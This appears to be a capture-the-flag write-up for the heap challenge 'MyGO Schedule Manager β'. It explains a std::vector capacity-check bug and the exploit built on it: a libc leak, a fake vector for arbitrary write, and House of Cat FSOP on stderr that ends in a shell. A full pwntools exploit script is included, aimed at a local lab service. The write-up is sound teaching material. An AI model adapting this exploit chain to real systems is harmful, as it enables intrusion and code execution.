# MyGO Schedule Manager β
> Author: 堇姬Naup

## analyze code

First, you need to login. Just input `MyGO!!!!!` in username and `TomorinIsCute` in password.

And then you will look four function about manipulate schedule.

1 -> add
2 -> edit
3 -> delete
4 -> show

`add_schedule` need to input a string which you want to emplace_back to schedule (std::vector<std::string>).
It'll check scedule not bigger than 4.

`edit_schedule` it need to two input. `index` and `string` 
It will edit schedule[index] to your input string.
And it will check your input not bigger than vector capacity(It is so strange, but let me later to descript it. It is this challenge core) 

`delete_schedule` is look like previous function.
User need to input index, it will erase vector.begin()+index.
This part check is the same, it check vector capacity.


Last function is show_schedule. It will show your schedule's string content.
And check is vector capacity.

PS: It has operation's times limit.

## Some Knowledge
First we need to know `std::vector` and `std::string` structure.
This is std::vector
| offset | description |
|--------|-------------|
| 0x0 | array's first element pointer |
| 0x8 | vector end pointer |
| 0x10 | array's capacity limit pointer  |

Anthor is std::string
| offset | description |
|--------|-------------|
| 0x0    | data's pointer |
| 0x8    | vector size |
| 0x10   | vector capacity |
| 0x18   | unused padding or alignment space |

OK, now you need to know vector capacity.
When vector need to let its capacity more bigger?
The answer is $2^n, n \in \{ 0, 1, 2, 3, \dots \}$
If it need to expand its capacity.
It will free origin chunk which store vector elements structure.
And alloc new chunk.

## analyze bug
We know vector's capacity will be expanded in advanced.
So, when vector elements count is 3.
Its capacity is four.

It will access out of vector's have element part.
So first we alloc 0x500 size std::string, and alloc 0x10 size(When you free 0x500, let your unsorted bin not consolidate to top chunk.)
And free 0x10 and free 0x500.
And you show chunk 0x500, fd and bk's libc address will be show.
We will leak libc (erase just destroy, not go to clear vector's element)
```c
iterator erase(iterator position){
    if(position + 1 != end()){
        copy(position+1,finish,position);
}
    --finish;
    destroy(finish);
    return position;
}
```

And we alloc one chunk, and input it like a fake vector (4 elements).
Fourth element 0x0 change to `You want to write address` (This is pointer point to data), and free this chunk.
0x8 and 0x10 set how many bytes you want to write.

Alloc three chunk:
When you allocate third chunk, vector capacity will be expanded to 4 and alloc new chunk store element struct.
In advanced, you have been freed one chunk which have written fake vector will be catch to use and fourth element have been put fake vector which point to `You want to write address`. 

When you read C++ source code, new allocate chunk didn't clear its chunk memory.

And it check index by capacity, so we can access this fake pointer(If we don't have UAF, when you add new schedule, your fake pointer will be overwritten).
OK, So we will get arbitrary write on libc (std::string).

We use house of cat (FSOP) and overwrite stderr. 
[House of cat](https://bbs.kanxue.com/thread-273895.htm)

And when this binary exit, We will get shell.

If you don't understand, go to read my script.

> PS: patch libc let you can success exploit on glibc 24.04. Use bindiff can more easily compare where I patch. (Just one part similarity is 0.99)


> PS: More information go to read c++ source code https://github.com/Naupjjin/gcc/tree/master

## script
```python
from pwn import *
from libs.NAUP_pwn_lib import *
import time
from libs.NAUP_filestructure_lib import *
from libs.NAUP_fmt_lib import *

#### This is a CTF pwn templates make by Naup

def s(payload): return r.send(payload)
def sl(payload): return r.sendline(payload)
def sla(after, payload): return r.sendlineafter(after, payload)
def sa(after, payload): return r.sendafter(after, payload)
def rc(num): return r.recv(num)
def rcl(): return r.recvline()
def rcls(num): return r.recvlines(num)
def rcu(payload): return r.recvuntil(payload)
def ita(): return r.interactive()
def cl(): return r.close()
def tsl(): return time.sleep(0.2)

x64_env()

REMOTE_LOCAL=input("local?(y/n):")

if REMOTE_LOCAL=="y":
    r=process('./chal')
    debug_init()
    
else:                                           
    REMOTE_INFO=split_nc("nc 127.0.0.1 51001")

    REMOTE_IP=REMOTE_INFO[0]
    REMOTE_PORT=int(REMOTE_INFO[1])

    r=remote(REMOTE_IP,REMOTE_PORT)

### attach
if input('attach?(y/n)') == 'y':
    p(r)

### heap IO
def login():
    sla(b"Username > ", b"MyGO!!!!!")
    sla(b"Password > ", b"TomorinIsCute")

def add(item):
    sla(b"< MyGO @ ScheduleManager $ > ", b"1")
    sla(b"Input item > ", item)

def edit(idx, item):
    sla(b"< MyGO @ ScheduleManager $ > ", b"2")
    sla(b"Index > ", str(idx).encode())
    sla(b"Edit item > ", item)

def delete(idx):
    sla(b"< MyGO @ ScheduleManager $ > ", b"3")
    sla(b"Index > ", str(idx).encode())

def show(idx):
    sla(b"< MyGO @ ScheduleManager $ > ", b"4")
    sla(b"Index > ", str(idx).encode())

def exitf():
    sla(b"< MyGO @ ScheduleManager $ > ", b"5")

### exploit

login()
add(b"a" * 0x500)
add(b"b" * 0x10)
delete(1)
delete(0)

show(0)
r.recvuntil(b'] is ')
leaklibc = (u64(r.recvline().strip()[:6].ljust(8,b'\x00')) << 8 ) + 0x20
libcbase = leaklibc - 0x203b20


IO_STDERR = libcbase + 0x2044e0
libc_system = libcbase + 0x58740

payload1  = p64(0xaabbccdd) + p64(0) + p64(0) + p64(0)
payload1 += p64(0xaabbccdd) + p64(0) + p64(0) + p64(0)
payload1 += p64(0xaabbccdd) + p64(0) + p64(0) + p64(0)
payload1 += p64(IO_STDERR) + p64(0x1d0) + p64(0x1d0) + p64(0)

add(payload1)
delete(0)

add(b'Tomorin')
add(b'Soyorin')
add(b'Rana')

libc_IO_wfile_jumps = libcbase + 0x202228
emptylibc = libcbase + 0x204bc0
fakew_data = IO_STDERR
fake_wow = IO_STDERR + 0x18

payload2  = b"sh;".ljust(8, b"\x00") # _flags

payload2  = payload2.ljust(0x20, b"\x00")
payload2 += p64(1)
payload2  = payload2.ljust(0x30, b"\x00")
payload2 += p64(libc_system)
payload2  = payload2.ljust(0x70, b"\x00")
payload2 += p32(2)
payload2  = payload2.ljust(0x78, b"\x00")
payload2 += p64(0xffffffffffffffff)
payload2  = payload2.ljust(0x88, b"\x00")
payload2 += p64(emptylibc) + p64(0xffffffffffffffff)
payload2  = payload2.ljust(0xa0, b"\x00")
payload2 += p64(fakew_data) 
payload2  = payload2.ljust(0xc0, b"\x00")
payload2 += p32(1)
payload2  = payload2.ljust(0xd8, b"\x00")
payload2 += p64(libc_IO_wfile_jumps + 0x30) + p64(fake_wow)

edit(3, payload2)


sl(b"5")

NAUPINFO("LEAKLIBC", hex(leaklibc))
NAUPINFO("LIBCBASE", hex(libcbase))
NAUPINFO('STD ERROR', hex(IO_STDERR))
### interactive
ita()
```








